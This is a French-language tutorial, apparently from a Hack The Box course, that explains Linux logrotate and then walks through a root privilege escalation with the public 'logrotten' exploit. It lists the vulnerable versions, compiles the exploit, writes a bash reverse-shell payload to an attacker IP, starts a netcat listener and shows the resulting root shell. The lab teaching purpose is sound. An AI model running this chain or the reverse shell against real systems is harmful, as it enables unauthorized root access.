Logrotate
=========

* * * * *

Chaque système Linux produit de grandes quantités de fichiers journaux. Pour éviter que le disque dur ne déborde, un outil appelé `logrotate`se charge d'archiver ou de se débarrasser des anciens journaux. Si aucune attention n'est accordée aux fichiers journaux, ils deviennent de plus en plus volumineux et finissent par occuper tout l'espace disque disponible. De plus, la recherche dans de nombreux fichiers journaux volumineux prend du temps. Pour éviter cela et économiser de l'espace disque, `logrotate `a été développé. Les journaux de connexion `/var/log`donnent aux administrateurs les informations dont ils ont besoin pour déterminer la cause des dysfonctionnements. Les détails système inaperçus, tels que le bon fonctionnement de tous les services, sont presque plus importants.

`Logrotate`dispose de nombreuses fonctionnalités pour gérer ces fichiers journaux. Ceux-ci incluent la spécification de:

-   le `size`fichier journal,
-   son `age`,
-   et le `action`à prendre lorsque l'un de ces facteurs est atteint.

```
dsgsec@htb[/htb]$ man logrotate
dsgsec@htb[/htb]$ # or
dsgsec@htb[/htb]$ logrotate --help

Usage: logrotate [OPTION...] <configfile>
  -d, --debug               Don't do anything, just test and print debug messages
  -f, --force               Force file rotation
  -m, --mail=command        Command to send mail (instead of '/usr/bin/mail')
  -s, --state=statefile     Path of state file
      --skip-state-lock     Do not lock the state file
  -v, --verbose             Display messages during rotation
  -l, --log=logfile         Log file or 'syslog' to log to syslog
      --version             Display version information

Help options:
  -?, --help                Show this help message
      --usage               Display brief usage message

```

La fonction de la rotation elle-même consiste à renommer les fichiers journaux. Par exemple, de nouveaux fichiers journaux peuvent être créés pour chaque nouveau jour, et les plus anciens seront renommés automatiquement. Un autre exemple serait de vider le fichier journal le plus ancien et ainsi de réduire la consommation de mémoire.

Cet outil est généralement démarré périodiquement via `cron`et contrôlé via le fichier de configuration `/etc/logrotate.conf`. Dans ce fichier, il contient des paramètres globaux qui déterminent la fonction de `logrotate`.

```
dsgsec@htb[/htb]$ cat /etc/logrotate.conf

# see "man logrotate" for details

# global options do not affect preceding include directives

# rotate log files weekly
weekly

# use the adm group by default, since this is the owning group
# of /var/log/syslog.
su root adm

# keep 4 weeks worth of backlogs
rotate 4

# create new (empty) log files after rotating old ones
create

# use date as a suffix of the rotated file
#dateext

# uncomment this if you want your log files compressed
#compress

# packages drop log rotation information into this directory
include /etc/logrotate.d

# system-specific logs may also be configured here.

```

Pour forcer une nouvelle rotation le même jour, la date après les fichiers journaux individuels dans le fichier d'état `/var/lib/logrotate/status`ou utilisez l' option `-f`/`--force` :

```
dsgsec@htb[/htb]$ sudo cat /var/lib/logrotate/status

/var/log/samba/log.smbd" 2022-8-3
/var/log/mysql/mysql.log" 2022-8-3

```

Nous pouvons trouver les fichiers de configuration correspondants dans `/etc/logrotate.d/`le répertoire.

```
dsgsec@htb[/htb]$ ls /etc/logrotate.d/

alternatives  apport  apt  bootlog  btmp  dpkg  mon  rsyslog  ubuntu-advantage-tools  ufw  unattended-upgrades  wtmp

```

```
dsgsec@htb[/htb]$ cat /etc/logrotate.d/dpkg

/var/log/dpkg.log {
        monthly
        rotate 12
        compress
        delaycompress
        missingok
        notifempty
        create 644 root root
}

```

Pour exploiter `logrotate`, nous avons besoin de certaines conditions que nous devons remplir.

1.  nous avons besoin `write`d'autorisations sur les fichiers journaux
2.  logrotate doit être exécuté en tant qu'utilisateur privilégié ou`root`
3.  versions vulnérables :
    -   3.8.6
    -   3.11.0
    -   3.15.0
    -   3.18.0

Il existe un exploit préfabriqué que nous pouvons utiliser pour cela si les conditions sont remplies. Cet exploit est nommé [logrotten](https://github.com/whotwagner/logrotten) . Nous pouvons le télécharger et le compiler sur un noyau similaire du système cible, puis le transférer sur le système cible. Alternativement, si nous pouvons compiler le code sur le système cible, nous pouvons le faire directement sur le système cible.

```
logger@nix02:~$ git clone https://github.com/whotwagner/logrotten.git
logger@nix02:~$ cd logrotten
logger@nix02:~$ gcc logrotten.c -o logrotten

```

Ensuite, nous avons besoin d'une charge utile à exécuter. Ici, de nombreuses options différentes s'offrent à nous que nous pouvons utiliser. Dans cet exemple, nous allons exécuter un shell inverse simple basé sur bash avec le `IP`et `port`de notre VM que nous utilisons pour attaquer le système cible.

```
logger@nix02:~$ echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload

```

Cependant, avant d'exécuter l'exploit, nous devons déterminer quelle option `logrotate`utilise dans `logrotate.conf`.

```
logger@nix02:~$ grep "create\|compress" /etc/logrotate.conf | grep -v "#"

create

```

Dans notre cas, c'est l'option : `create`. Il faut donc utiliser l'exploit adapté à cette fonction.

Après cela, nous devons démarrer un écouteur sur notre VM / Pwnbox, qui attend la connexion du système cible.

```
dsgsec@htb[/htb]$ nc -nlvp 9001

Listening on 0.0.0.0 9001

```

Dans une dernière étape, nous exécutons l'exploit avec la charge utile préparée et attendons un shell inversé en tant qu'utilisateur privilégié ou root.

```
logger@nix02:~$ ./logrotten -p ./payload /tmp/tmp.log

```

```
...
Listening on 0.0.0.0 9001

Connection received on 10.129.24.11 49818
# id

uid=0(root) gid=0(root) groups=0(root)
```
